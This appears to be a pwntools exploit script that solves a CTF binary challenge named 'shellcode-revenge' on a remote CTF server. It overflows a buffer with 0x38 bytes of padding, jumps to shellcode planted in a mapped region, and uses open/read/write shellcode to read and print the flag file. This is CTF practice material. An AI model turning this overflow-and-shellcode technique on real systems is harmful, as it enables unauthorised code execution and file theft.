from pwn import *

# io = remote("192.168.170.128", 1234)
# context.arch = "amd64"
io = remote("node5.buuoj.cn", 26855)
elf = ELF('shellcode-revenge')
context.arch = elf.arch

se = lambda data: io.send(data)
sa = lambda delim, data: io.sendafter(delim, data)
sl = lambda data: io.sendline(data)

mmap = 0x233000
se(asm(shellcraft.read(0, mmap + 21, 0x800)))
print(len(asm(shellcraft.read(0, mmap + 21, 0x800))))
orw_payload = shellcraft.open('./flag')
orw_payload += shellcraft.read(3, mmap + 0x850, 0x50)
orw_payload += shellcraft.write(1, mmap + 0x850, 0x50)
print(orw_payload)
print(asm(orw_payload))
sl(b'a' * 0x38 + p64(mmap))
sl(asm(orw_payload))

io.interactive()
